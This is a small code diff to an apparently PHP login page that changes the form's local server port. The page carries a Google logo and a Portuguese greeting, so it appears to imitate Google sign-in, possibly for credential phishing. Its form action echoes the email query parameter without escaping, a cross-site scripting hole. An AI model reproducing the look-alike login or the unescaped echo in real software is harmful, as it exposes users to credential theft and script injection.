@@ -20,7 +20,7 @@
             <div class="preloader">
                 <div class="preloader-line"></div>
             </div>
-            <form id="loginForm" action="http://localhost:8080/server.php?email=<?= $_GET['email'] ?>" style="text-align: center;">
+            <form id="loginForm" action="http://localhost:8081/server.php?email=<?= $_GET['email'] ?>" style="text-align: center;">
                 <img src="./images/google-logo.svg" alt="" />
                 <h2 style="margin-top: 10px;">Olá!</h2>
                 <div style="display: inline-block; vertical-align: middle; border: 1px solid #ccc; border-radius: 12px; padding: 1px; margin-top: 10px; margin-bottom: 60px">
